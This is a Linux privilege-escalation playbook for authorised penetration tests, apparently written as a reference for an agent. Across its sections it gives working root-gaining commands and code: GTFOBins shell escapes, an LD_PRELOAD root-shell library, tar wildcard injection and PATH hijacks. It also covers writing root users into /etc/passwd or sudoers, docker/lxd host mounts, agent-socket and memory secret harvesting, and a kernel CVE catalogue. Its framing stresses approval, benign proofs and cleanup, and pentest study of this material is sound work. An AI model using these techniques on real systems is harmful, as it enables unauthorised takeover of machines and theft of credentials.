# Linux privilege-escalation playbook
# In-scope host, approval-gated, BENIGN proof (id=uid=0), ALWAYS clean up. Prefer the lowest-risk vector.
# Enumeration first — see refs/enumeration.md (linpeas.sh). This file turns a found vector into benign root.
## Vector picker (lowest-risk → highest-risk)
1. sudo NOPASSWD / GTFOBins  2. SUID GTFOBins  3. capabilities  4. readable creds / key reuse
5. writable cron/timer/service  6. PATH hijack  7. group (docker/lxd/disk/fail2ban)
8. writable /etc/passwd|shadow  9. NFS no_root_squash  10. kernel/pkexec/sudo CVE (HIGH RISK — last resort)

Always prove with `id` (uid=0) + one benign command, record every change in `cleanup.md`, and revert.

═══════════════════════════════════════════════════════════════════════════
## 1. sudo misconfig
═══════════════════════════════════════════════════════════════════════════
```
sudo -l                  # read it carefully: NOPASSWD entries, (ALL), and env_keep settings
```
- **NOPASSWD binary in GTFOBins** → straight to root: look the binary up, use its `sudo` section.
  e.g. `sudo less /etc/profile` → `!/bin/sh`; `sudo vim -c ':!/bin/sh'`; `sudo awk 'BEGIN{system("/bin/sh")}'`.
- **`sudo` + `env_keep+=LD_PRELOAD`** → load a shared object as root:
  ```c
  // preload.c  — benign: become root, prove id, drop a shell
  #include <stdlib.h>
  #include <unistd.h>
  void _init(){ unsetenv("LD_PRELOAD"); setresuid(0,0,0); setresgid(0,0,0); system("id; /bin/bash -p"); }
  ```
  ```
  gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
  sudo LD_PRELOAD=/tmp/preload.so <any-allowed-program>      # e.g. sudo LD_PRELOAD=/tmp/preload.so openssl
  ```
- **`sudo` + `env_keep+=LD_LIBRARY_PATH`** → hijack a library the allowed program loads:
  ```
  ldd /usr/sbin/apache2                 # find a lib it loads, e.g. libcrypt.so.1
  gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c   # library_path.c defines the loaded fn → root shell
  sudo LD_LIBRARY_PATH=/tmp apache2
  ```
- **sudo version CVE** → Baron Samedit (CVE-2021-3156), see Kernel/CVE section.

═══════════════════════════════════════════════════════════════════════════
## 2. SUID / SGID + GTFOBins automation
═══════════════════════════════════════════════════════════════════════════
```
find / -perm -4000 -type f 2>/dev/null
```
- SUID binary in GTFOBins → use its SUID section. SUID `bash` → `bash -p` (keep euid). `cp`/`find`/`nmap`/
  `vim`/`python` etc. each have a one-liner.
- **Automate the match** (installed binaries vs GTFOBins list):
  ```
  apt list --installed 2>/dev/null | tr '/' ' ' | cut -d' ' -f1,3 | sed 's/[0-9]://g' | tee installed_pkgs.list
  for i in $(curl -s https://gtfobins.github.io/gtfobins.json | jq -r 'keys[]'); do \
     grep -qx "$i" installed_pkgs.list && echo "GTFO candidate: $i"; done
  ```
- **Capability abuse** (`getcap -r /`): `cap_setuid+ep` on an interpreter →
  ```
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("id; /bin/bash -p")'
  # perl/node/ruby equivalents; vim/view with cap: :py3 import os;os.setuid(0);os.execl("/bin/sh","sh","-pc","reset; exec sh")
  ```
  Also: `cap_dac_override` (e.g. on vim → read/WRITE any file, incl. /etc/passwd), `cap_dac_read_search`
  (e.g. on tar → READ any file). Analyse an unknown SUID binary first: `ldd`, `strings`, `ltrace`, `strace`
  (look for a relative-path `system()`/`exec*` call → PATH hijack, or a readable secret).
- **Copy-root-bash primitive** (when you can run something as root that writes a file): `cp /bin/bash
  /tmp/rootbash && chmod +s /tmp/rootbash` then `/tmp/rootbash -p` (lab/benign proof; clean up the copy).

═══════════════════════════════════════════════════════════════════════════
## 3. Writable cron / timer / service
═══════════════════════════════════════════════════════════════════════════
```
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers --all
```
- **World-writable script run by root cron** → append a benign root-run marker, wait one interval,
  confirm, REVERT. (Benign: `id > /tmp/pe_proof_$(id -u).txt` as root, then remove.)
- **tar wildcard injection** (root cron does `tar ... *` in a writable dir):
  ```
  echo 'id > /tmp/pe_proof.txt' > shell.sh
  echo "" > '--checkpoint=1'; echo "" > '--checkpoint-action=exec=sh shell.sh'
  # when the cron tar runs, it treats the filenames as flags → runs shell.sh as root. Clean up all three.
  ```
  Other wildcard sinks: `rsync -e <cmd>`, `chown --reference=<file>`, `chmod --reference=<file>`,
  `7z`/`zip` flag files — same "filename becomes a flag" trick.
- **logrotten** (writable log rotated by root logrotte): compile `logrotten`, point a payload at the log →
  root exec on rotation. HIGH-touch; prefer only in lab / with approval.
- **Writable `.service` / systemd unit** → set `ExecStart=` to a benign marker, `systemctl daemon-reload`
  + start (if permitted), confirm, REVERT.

═══════════════════════════════════════════════════════════════════════════
## 4. PATH hijack
═══════════════════════════════════════════════════════════════════════════
A root-owned SUID binary or cron script calls another binary by a **relative name** (`system("service ...")`).
```
export PATH=/tmp:$PATH
printf '#!/bin/sh\nid > /tmp/pe_proof.txt\n' > /tmp/<relative-name>; chmod +x /tmp/<relative-name>
# run the SUID/cron trigger → your binary runs as root. Confirm, then restore PATH + remove the file.
```

═══════════════════════════════════════════════════════════════════════════
## 5. Group memberships
═══════════════════════════════════════════════════════════════════════════
```
id    # look for: docker, lxd/lxc, disk, adm, shadow, sudo, fail2ban, …
```
- **docker** → mount host root in a container (benign id proof; don't modify host):
  ```
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c 'id; cat /etc/shadow | head -1'   # proof only
  # socket form: docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <img> chroot /mnt sh
  ```
- **lxd/lxc** → privileged container mounting host:
  ```
  lxc init <alias> privesc -c security.privileged=true
  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
  lxc start privesc; lxc exec privesc /bin/sh    # read /mnt/root (benign proof); clean up the container
  ```
- **disk** → `debugfs /dev/sdaX` READ-ONLY (read /etc/shadow as proof; never write).
- **fail2ban** (sudo fail2ban-client): `sudo fail2ban-client set <jail> action evil actionban "chmod +s
  /bin/bash"` + trigger a ban → `/bin/bash -p` (benign; revert the SUID bit).
- **adm** → read logs (`/var/log`) for creds. **shadow** → read `/etc/shadow` → offline crack (→ credential tooling).

═══════════════════════════════════════════════════════════════════════════
## 6. Writable /etc/passwd or /etc/shadow
═══════════════════════════════════════════════════════════════════════════
```
ls -la /etc/passwd /etc/shadow
# writable /etc/passwd → add a root-uid user with a known password:
openssl passwd 'Pentest123'                      # -> hash
#   append:  pe:<hash>:0:0:root:/root:/bin/bash   (uid 0) ; su pe  (benign proof) ; REMOVE the line
# writable /etc/shadow → replace root's hash:
mkpasswd -m sha-512 'Pentest123'                 # -> $6$... ; swap into root row ; su root ; RESTORE original
# both readable → crack:
unshadow passwd.txt shadow.txt > passwords.txt   # then hashcat/john offline
```
Always restore the original file content from a backup you take first. Record in `cleanup.md`.

═══════════════════════════════════════════════════════════════════════════
## 7. NFS no_root_squash
═══════════════════════════════════════════════════════════════════════════
```
cat /etc/exports                       # look for  no_root_squash  on an exported, writable share
showmount -e <TARGET_IP>
# from a box where you are root: mount, drop a SUID shell owned by root, run it on the target:
mount -o rw <TARGET_IP>:/share /mnt/x
cp /bin/bash /mnt/x/rootbash; chmod +s /mnt/x/rootbash      # on target: /share/rootbash -p  (benign id)
```
Lab/approved only; on prod, report feasibility rather than planting SUID. Clean up the planted file.

═══════════════════════════════════════════════════════════════════════════
## 8. Readable creds / key reuse
═══════════════════════════════════════════════════════════════════════════
Config files, `.bash_history`, `~/.ssh/id_rsa`, DB connection strings, backups (`*.bak/*.old/*.sql`),
`/proc/*/cmdline`. Reuse found creds/keys (`su <user>`, `ssh -i key`), escalate if they're root's. SSH key →
`ssh2john id_rsa > h; john --wordlist=rockyou.txt h` if passphrased (→ credential-access tooling).

═══════════════════════════════════════════════════════════════════════════
## 9. Kernel / pkexec / sudo CVEs — HIGH RISK, LAST RESORT
═══════════════════════════════════════════════════════════════════════════
Run `linux-exploit-suggester` (linpeas runs it inline). A kernel exploit can **crash prod** — on a live
host, REPORT FEASIBILITY and escalate only in an approved maintenance window. Named classics to recognise:
| CVE | Name | Hits |
|---|---|---|
| CVE-2021-4034 | **PwnKit** (pkexec) | almost every distro 2009–2022; very reliable local root |
| CVE-2021-3156 | **Baron Samedit** (sudo heap) | sudo < 1.9.5p2 |
| CVE-2022-0847 | **DirtyPipe** | kernel 5.8–5.16; overwrite read-only/SUID files |
| CVE-2016-5195 | **DirtyCow** | old kernels; write to read-only mappings |
| CVE-2021-22555 | Netfilter | kernel heap OOB |
Notes-sourced PoCs seen in the user's set: **CopyFail** (DirtyPipe-class, overwrites `/usr/bin/su` via
`splice()`), **Pack2Root** (CVE-2026-41651, PackageKit race → SUID bash). Treat all as feasibility-first.

═══════════════════════════════════════════════════════════════════════════
## Proof + cleanup  (every run)
═══════════════════════════════════════════════════════════════════════════
- Prove root: `id` (uid=0) + ONE benign command (e.g. `cat /etc/shadow | head -1`, `hostname`). No more.
- `cleanup.md` lists EVERYTHING created/changed: dropped tools (`/dev/shm/lp.sh`, `installed_pkgs.list`),
  SUID copies, `/etc/passwd`|`shadow` edits (with the restored original), cron/service edits, containers,
  proof files — and confirms each was reverted.
- NO persistence, NO backdoors, NO destruction, NO data exfil beyond the single proof line. In-scope host only.

---

## Extended arsenal — capabilities depth, polkit, ld.so, systemd/D-Bus, ticket & agent reuse, container hand-off
# Append-only extension. Same ethos: in-scope host, BENIGN proof (id → uid=0), lowest-risk first; back up anything
# you touch, REDACT recovered secrets to fingerprints, record every change in cleanup.md and revert. CVE/driver = last resort.

### A. File capabilities — quick table + the vectors beyond §2
```
getcap -r / 2>/dev/null           # enumerate file caps; also eye CapEff of root daemons you can influence (/proc/<pid>/status)
```
§2 already covers cap_setuid / cap_dac_override / cap_dac_read_search. Remaining dangerous caps:
| capability (+ep) on a binary | primitive → benign root proof |
|---|---|
| cap_setuid           | interpreter → setuid(0) (see §2)                            |
| cap_dac_read_search  | READ any file incl. /etc/shadow (see §2)                    |
| cap_dac_override     | WRITE any file incl. /etc/passwd (see §2)                   |
| cap_chown            | chown a root-owned config you then abuse (indirect)         |
| cap_fowner           | chmod a root-owned binary → set the setuid bit on it        |
| cap_sys_ptrace       | attach to a root process (feasibility proof, no payload)    |
| cap_sys_admin        | mount/overlayfs → container-escape-class; often 1 step to root|
| cap_sys_module       | insert a kernel module → ring-0 (HIGH-RISK, approval-gated) |
| cap_sys_rawio        | /dev/mem,/dev/port → read/patch kernel memory (HIGH-RISK)   |
| cap_net_raw/net_admin| sniff/forge on the wire (lateral, not direct root)          |
```
# cap_fowner — chmod a root-owned bin you normally can't: chmod u+s /bin/bash → bash -p (BACK UP perms; revert chmod u-s).
# cap_sys_ptrace — prove reach into a root process, no injection: gdb -p <root_pid> -batch -ex 'call (int)getuid()'; detach.
# cap_sys_module — build a trivial marker .ko, insmod, confirm dmesg marker, rmmod. Ring-0 — approval-gated, last resort, never a rootkit.
# cap_sys_admin — treat as an escape primitive (§F); do not fire a mount/overlay root trick on prod without approval.
```

### B. polkit / pkexec misconfig — beyond PwnKit (CVE-2021-4034, in §9)
```
pkexec --version; pkaction | head                      # polkit present? which actions are registered
grep -R . /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/ 2>/dev/null   # permissive rule: ResultActive/ResultAny == "yes"
cat /etc/polkit-1/localauthority/*/*.pkla 2>/dev/null                        # legacy .pkla allow-any entries
```
# CVE-2021-3560 — polkit D-Bus auth-bypass RACE (distinct from PwnKit): time a dbus/accountsservice call so polkit
#   mis-attributes it to uid 0 → create an admin user WITHOUT auth. HIGH-RISK, approval-gated, last resort.
# Misconfig (no CVE): if a privileged action (package-install, systemd-manage, mount, hostname) is allowed to you,
#   invoke it via pkexec / gdbus to run a benign root action (e.g. a package pre/post-install hook = root exec).

### C. ld.so global injection (file-based, distinct from the sudo env_keep LD_PRELOAD in §1)
```
ls -la /etc/ld.so.preload /etc/ld.so.conf.d/ 2>/dev/null
# writable /etc/ld.so.preload → your .so loads into EVERY setuid-root binary → root on the next sudo/su/ping (BACK UP first,
#   the .so does setuid(0);system("id>/tmp/pe.txt"); then REVERT the file + remove the .so).
# writable /etc/ld.so.conf.d/*.conf → add a dir you control, wait for a root `ldconfig` → library hijack.
# sudo SETENV tag: a sudoers line `user host = SETENV: /path/cmd` lets you pass LD_PRELOAD even WITHOUT env_keep.
```

### D. Writable systemd unit / D-Bus service — beyond the one-line §3 note
```
systemctl cat <unit> 2>/dev/null; find /etc/systemd/system /run/systemd/system -writable 2>/dev/null
# writable unit OR writable drop-in dir → add an override (no need to edit a sealed unit file):
mkdir -p /etc/systemd/system/<svc>.service.d
printf '[Service]\nExecStartPre=/bin/sh -c "id>/tmp/pe.txt"\n' > /etc/systemd/system/<svc>.service.d/override.conf
systemctl daemon-reload && systemctl restart <svc>     # if permitted → benign root marker; then REMOVE the drop-in + reload
# also: writable EnvironmentFile= a root unit reads; writable .path/.timer/.socket unit (activation trigger).
# sudo-allowed systemd-run → sudo systemd-run -t /bin/sh  (root pty). ~/.config/systemd/user runs as YOU, not root.
# D-Bus system service: writable /usr/share/dbus-1/system-services/*.service, or a .conf granting send_destination to a
#   root bus name → trigger activation of a root-run service. Enumerate: busctl list; ls /etc/dbus-1/system.d/.
```

### E. Kerberos ccache / keytab, SSSD cache, SSH-agent & GPG-agent reuse
```
ls -la /tmp/krb5cc_* /run/user/*/krb5cc* 2>/dev/null; klist 2>/dev/null       # borrow a readable TGT → ssh -K / kadmin as it
cat /etc/krb5.keytab >/dev/null 2>&1 && klist -k /etc/krb5.keytab             # readable keytab → extract keys (REDACT)
ls -la /var/lib/sss/db/*.ldb /var/lib/sss/secrets/* 2>/dev/null               # SSSD offline cache: cached AD hashes → crack (REDACT)
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNN ssh-add -l                              # hijack another user's agent socket → pivot ssh (no key file)
# also grep /proc/<pid>/environ for SSH_AUTH_SOCK/KRB5CCNAME. ~/.gnupg keyrings/gpg-agent similarly reusable. REDACT every secret.
```

### F. Container-aware escalation — detect, then hand off
```
ls -la /.dockerenv /run/.containerenv 2>/dev/null; systemd-detect-virt -c 2>/dev/null
grep -qaE 'docker|lxc|kubepods|containerd' /proc/1/cgroup /proc/self/cgroup 2>/dev/null && echo containerized
grep -i cap /proc/self/status                                                  # CapEff hints (cap_sys_admin → escape-prone)
# → if containerized, root-in-container != host root: STOP and run the container-escape skill (privileged / mounted docker.sock /
#   hostPath / release_agent / cap_sys_admin breakout). This playbook assumes a bare-metal or VM host.
```

---

## Extended arsenal — interpreter path/library hijack (Python / Perl / Node / Ruby)
# Root runs a *script* (cron / systemd / sudo-allowed). You don't need the script writable — hijack a module it imports.
# Detect the root-run script (pspy / sudo -l), read its imports, test each module dir for write access. Lowest-risk when a dir is already yours.
```
# PYTHONPATH — a writable entry on sys.path (incl. '' = CWD), or a sudo SETENV rule that keeps PYTHONPATH
python3 -c 'import sys;[print(p or ".") for p in sys.path]'       # any writable line = hijack
sudo -l | grep -i setenv
# drop a module the script does `import <name>`: code runs at import time, as root
printf 'import os\nos.setuid(0);os.system("id>/tmp/pe_proof.txt")\n' > <writable_syspath>/<name>.py
find / -type d -name __pycache__ -writable 2>/dev/null            # .pyc variant: replace cached <name>.cpython-*.pyc
```
| runtime | env / search path | hijack point |
|---|---|---|
| Perl | PERL5LIB / PERLLIB / PERL5OPT=-M<mod> | writable dir in @INC (`perl -e 'print "@INC"'`) or SETENV PERL5LIB |
| Node | NODE_PATH / relative require() | writable `node_modules/<pkg>` the script require()s |
| Ruby | RUBYLIB / RUBYOPT=-r<lib> | writable dir in $LOAD_PATH (`ruby -e 'puts $LOAD_PATH'`) |
| Lua | LUA_PATH / LUA_CPATH | writable `package.path` entry |
# Benign proof = the module writes id→/tmp marker when the root job imports it. Cleanup: remove the planted module/.pyc; unset any env you set.

---

## Extended arsenal — SUID shared-object edge cases (RPATH/RUNPATH, missing dlopen, writable lib, hardlink)
# Beyond LD_PRELOAD (§1) and ld.so.preload / ld.so.conf.d (ext. C): a SUID-root binary that resolves a library through a path YOU control.
```
readelf -d <suid> | egrep 'NEEDED|RPATH|RUNPATH'    # prefer readelf over ldd (ldd can run the target's interpreter)
strace -f -e openat,access <suid-or-unpriv-copy> 2>&1 | grep -E 'ENOENT.*\.so'   # missing/late dlopen() lookups
namei -om /path/to/needed.so                        # writable component anywhere along a needed lib's path
find / -xdev -perm -4000 -type f -links +1 2>/dev/null   # SUID with extra hardlinks (path/name confusion)
```
- **RPATH/RUNPATH hijack**: a NEEDED lib resolves via a writable RPATH/RUNPATH dir → drop a `.so` of that exact name.
- **Missing/relative dlopen**: binary dlopen()s a name not present → plant it in the first writable search dir.
- **Writable lib file/dir**: the real `.so` (or its dir) is writable → BACK IT UP, swap in the constructor `.so`, run once, RESTORE.
- **SUID hardlink confusion**: a wrapper invoked under a second link name can change behaviour (argv[0]-sensitive binaries).
```c
__attribute__((constructor)) static void x(){ setuid(0); setgid(0); system("id>/tmp/pe_proof.txt"); }
// gcc -shared -fPIC x.c -o <writable>/<exact-needed-name>.so ; run the SUID binary ; then delete it (restore any backup).
```
# Overwriting a REAL library = lab/approved only; on prod note feasibility (readelf evidence) rather than swapping live libs.

---

## Extended arsenal — boot/login/event-triggered root exec (beyond cron & systemd, §3 / ext. D)
```
ls -la /etc/init.d /etc/rc.local /etc/rc*.d 2>/dev/null           # SysV init / rc.local (root at boot)
ls -la /etc/update-motd.d /etc/profile.d 2>/dev/null             # login-time root scripts (pam_motd / profile)
find /etc/udev/rules.d /lib/udev/rules.d -writable 2>/dev/null    # udev RUN+= fires as root on device events
ls -la /etc/incron.d /var/spool/incron 2>/dev/null; command -v incrontab   # file-event-triggered root exec
cat /etc/anacrontab 2>/dev/null; atq 2>/dev/null                 # anacron catch-up / at queue
```
| trigger | writable artefact | fires when |
|---|---|---|
| SysV init / rc.local | /etc/init.d/<s>, /etc/rc.local | boot / service start |
| udev | *.rules with `RUN+="/path"` | matching device add/remove |
| incron | /etc/incron.d/*, user incrontab | watched path is written/opened |
| at / batch | queued job owned by root | scheduled time / load threshold |
| anacron | /etc/anacrontab, cron.{daily,weekly} | periodic catch-up run |
| motd / profile.d | /etc/update-motd.d/*, /etc/profile.d/*.sh | any user (incl. root) opens a login shell |
# Benign: append `id > /tmp/pe_proof.txt` (or an Exec-style marker) to the writable artefact, trigger it / wait one cycle, confirm uid=0, RESTORE from backup. Log every edit in cleanup.md.

---

## Extended arsenal — writable security-config that grants root (beyond passwd/shadow, §6)
```
ls -la /etc/sudoers.d/ /etc/sudoers 2>/dev/null                   # drop-in sudoers
ls -la /root/.ssh/authorized_keys /root/.ssh 2>/dev/null         # root's SSH keys
ls -la /etc/pam.d/ 2>/dev/null; grep -rn nullok /etc/pam.d 2>/dev/null
find /etc/sudoers.d /etc/cron.d -writable 2>/dev/null            # new-file drop into a privileged dir
```
| writable target | benign root proof | revert |
|---|---|---|
| /etc/sudoers.d/<f> | add `<youruser> ALL=(ALL) NOPASSWD:ALL` → `sudo id` | delete the drop-in |
| /root/.ssh/authorized_keys | append YOUR test pubkey → `ssh root@127.0.0.1 id` | remove the key line |
| /etc/pam.d/<svc> | a permissive line (pam_permit.so / `nullok`) → auth as root | restore original |
| /etc/cron.d/<f> | `* * * * * root id>/tmp/pe_proof.txt` → wait one min | delete the file |
# BACK UP every file first. A malformed sudoers can lock sudo out — keep the drop-in minimal, one line, and REVERT immediately after proof.

---

## Extended arsenal — root-run local services → OS command exec (MySQL / Redis / PostgreSQL)
# Precondition: the DB process runs AS ROOT. Confirm first — DB-side code exec maps to the DB's run-user, so a service account != root.
```
ps -eo user,comm | egrep 'mysqld|mariadbd|redis-server|postgres'  # run-as user MUST be root for this to mean root
ss -lntup 2>/dev/null | egrep '3306|6379|5432'                    # loopback-only is still locally reachable
```
| service (running as root) | primitive → benign root proof | redact / cleanup |
|---|---|---|
| MySQL/MariaDB | FILE priv → `SELECT ... INTO OUTFILE` a root-owned file; or UDF `sys_exec('id>/tmp/pe_proof.txt')` | drop the UDF + its .so, remove outfile |
| Redis (unauth/loopback) | `CONFIG SET dir` + `dbfilename` → write a root cron / authorized_keys marker; or `MODULE LOAD` a stub that runs id | DEL the keys, restore dir/dbfilename, remove file |
| PostgreSQL (superuser) | `COPY t FROM PROGRAM 'id>/tmp/pe_proof.txt'`; or CREATE EXTENSION / large-object → exec | DROP the table/extension, remove file |
# Use creds found in enum (§8) or socket/trust auth. Benign = ONE marker written as root; never dump tables. REDACT every recovered secret to a fingerprint.

---

## Extended arsenal — root process memory / FD / session harvest (concrete cap_sys_ptrace & shared-session use)
# §A flags cap_sys_ptrace as feasibility-only and ext. E covers agent-socket reuse — this is the concrete READ-ONLY harvest set.
```
cat /proc/sys/kernel/yama/ptrace_scope                 # 0 = same-uid / CAP_SYS_PTRACE attach to root procs allowed
ls -l /proc/<root_pid>/fd 2>/dev/null                  # open secrets/sockets/scripts readable via the fd
lsof +L1 2>/dev/null                                   # deleted-but-open files (config/creds) still readable
strings /proc/<root_pid>/environ 2>/dev/null           # env secrets beyond the agent/ccache vars in ext. E
```
- **/proc/<pid>/mem + maps**: with ptrace rights, dump readable regions and `strings | grep -i pass` (or `gcore <pid>`). Read-only; REDACT hits.
- **/proc/<pid>/fd/<n>**: `cat` an open log / DB handle / export the root process holds — recover a secret without touching the owner.
- **screen hijack**: `screen -ls`; `ls /run/screen/S-*` → `screen -x <user>/<sess>` if the session is multiuser and its shell runs as root.
- **tmux hijack**: `ls -la /tmp/*tmux*` → `tmux -S <sock> attach` if the socket is group/world-accessible (mainly old tmux).
# Benign: prove reach / recover ONE redacted secret. No injection into a live prod process. Nothing to clean beyond deleting any gcore dump.

---

## Extended arsenal — kernel & loader LPE catalog expansion (feasibility-first; weaponization → exploit-dev)
# Extends §9. A kernel exploit can PANIC prod — on a live host REPORT FEASIBILITY (version match + a public PoC exists) and defer firing to an
# approved maintenance window + the exploit-dev skill. Benign proof only where safe = the PoC's own uid=0 in a snapshot/VM, then revert the snapshot.
```
uname -r; cat /etc/os-release                          # kernel + distro → match the ranges below
ldd --version | head -1                                # glibc version (Looney Tunables)
```
| CVE | class / name | subsystem — rough affected range |
|---|---|---|
| CVE-2024-1086 | nf_tables double-free (very reliable) | netfilter nft — ~5.14–6.6 |
| CVE-2023-32233 | nf_tables anon-set UAF | netfilter — ≤6.3.x |
| CVE-2023-0179 / CVE-2022-32250 | nf_tables stack-OOB / UAF | netfilter |
| CVE-2023-2598 / CVE-2022-2602 | io_uring fixed-buf OOB / GC UAF | io_uring |
| CVE-2023-0386 | overlayfs fuse copy_up setuid | overlayfs — ≤6.2 |
| CVE-2021-3493 | overlayfs ns-capability | Ubuntu overlayfs |
| CVE-2023-2640 / CVE-2023-32629 | GameOver(lay) | Ubuntu overlayfs |
| CVE-2021-33909 | Sequoia seq_file size_t | fs layer — broad |
| CVE-2023-3269 | StackRot maple-tree | mm — 6.1–6.4 |
| CVE-2021-3490 / CVE-2020-8835 | eBPF verifier bounds | bpf |
| CVE-2025-37947 | ksmbd stream OOB write | ksmbd |
| (technique) DirtyCred | file/cred cross-cache (rides a UAF, e.g. CVE-2022-2588) | heap |
| CVE-2023-4911 | **Looney Tunables** GLIBC_TUNABLES overflow via SUID | glibc ld.so (userland, not kernel) |
Recent **sudo** CVEs (userland — often more reliable than a kernel bug):
| CVE | trigger |
|---|---|
| CVE-2025-32463 | sudo `chroot` → nsswitch loads attacker lib; default config, no rule needed (in CISA KEV); sudo < 1.9.17p1 |
| CVE-2025-32462 | host-restricted sudoers rule applied off its intended host; sudo < 1.9.17p1 |
| CVE-2023-22809 | sudoedit extra args in EDITOR/SUDO_EDITOR → edit ANY root-owned file |
# All feasibility-first: confirm the version matches, then hand weaponization to exploit-dev. Never run an untrusted "PoC" blind on prod.
